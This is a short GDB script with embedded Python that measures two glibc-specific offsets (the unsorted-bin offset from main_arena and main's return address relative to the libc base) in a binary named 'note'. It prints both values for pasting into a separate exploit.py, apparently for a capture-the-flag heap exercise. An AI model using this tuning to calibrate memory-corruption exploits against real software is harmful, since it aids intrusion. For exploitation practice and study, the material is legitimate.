# Measures the two per-libc constants for exploit.py on THIS machine's glibc.
#   run:  gdb -q -batch -x tune.gdb ./note
set pagination off
set exec-wrapper env -i
break main
run
python
import gdb, struct
def A(e): return int(gdb.parse_and_eval(e))
lb=None
for l in gdb.execute("info proc mappings", to_string=True).splitlines():
    if "libc.so.6" in l:
        b=int(l.split()[0],16); lb=b if lb is None else min(lb,b)
try:
    arena=A("(long)&main_arena")
    unsorted="%#x" % (arena-lb+0x60)
except gdb.error:
    unsorted="<gdb lacks main_arena symbol; install libc6-dbg or leak-and-subtract>"
f=gdb.newest_frame()
while f and f.name()!="main": f=f.older()
slot=int(f.read_register("rbp"))+8
ret=struct.unpack("<Q",bytes(gdb.selected_inferior().read_memory(slot,8)))[0]
print("=== paste these into exploit.py ===")
print("UNSORTED_OFF = %s" % unsorted)
print("MAIN_RET_OFF = %#x" % (ret-lb))
end
quit
